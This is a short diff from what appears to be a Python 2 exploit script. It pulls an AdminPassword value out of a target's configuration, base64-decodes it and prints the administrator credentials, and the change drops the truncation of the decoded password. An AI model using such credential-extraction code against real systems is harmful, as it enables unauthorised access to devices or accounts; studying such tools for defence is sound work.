@@ -34,7 +34,7 @@ class Target(object):
 		end = self.config.find("</AdminPassword>")
 		password = self.config[beg:end]
 		print "[+] Decoding admin password"
-		admin = base64.decodestring(password)[0:4]
+		admin = base64.decodestring(password)
 		print "\n\n[+] Admin credentials:\tadmin:"+admin+"\n\n"
 
 def main():
